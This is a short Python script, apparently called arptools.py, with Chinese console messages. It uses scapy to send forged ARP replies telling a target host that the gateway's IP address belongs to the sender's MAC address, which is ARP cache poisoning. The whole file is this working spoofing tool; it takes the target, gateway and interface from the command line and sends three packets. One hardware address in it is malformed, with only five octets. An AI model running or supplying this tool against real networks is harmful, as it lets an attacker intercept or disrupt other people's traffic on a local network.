from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import sys
import time

class ArpTools:
    def __init__(self,dst_ip,gateway,dst_mac=None,interface=None):
        self.dst_ip = dst_ip
        self.gateway = gateway
        self.dst_mac = dst_mac
        self.interface = interface or conf.iface
        try:
            self.src_mac = get_if_hwaddr(self.interface)
        except Exception as err:
            self.src_mac = "00:00:00:00:00:00"
            print(f"接口{self.interface}MAC地址获取失败。({err})")
            sys.exit()
        if dst_mac is None:
            self.dst_mac = "ff:ff:ff:ff:ff:ff"
    def fake_arp(self):
        fake_arp = Ether(dst = self.dst_mac) / ARP(
            op = 2,
            hwsrc = self.src_mac,
            psrc = self.gateway,
            hwdst = "ff:ff:ff:ff:ff",
            pdst = self.dst_ip
        )
        count = 0
        while True:
            sendp(fake_arp, iface= self.interface, verbose=False)
            count += 1
            print(f"[{count}] 已发送欺骗包 -> 告诉 {self.dst_ip} 网关 {self.gateway} 的MAC是 {self.src_mac}")
            time.sleep(3)
            if count == 3:
                break
        sys.exit(0)

def main():
    if len(sys.argv) < 3:
        print("Error - 缺少必要参数。")
        print("eg: python3 arptools.py <dst_ip> <gateway> <eth>")
        sys.exit()

    dst_ip = sys.argv[1]
    gateway = sys.argv[2]
    interface = sys.argv[3]

    try:
        arp = ArpTools(dst_ip=dst_ip, gateway=gateway, interface=interface)
        arp.fake_arp()
    except Exception as err:
        print(f"发生错误 - {err}")
        sys.exit()

if __name__ == "__main__":
    main()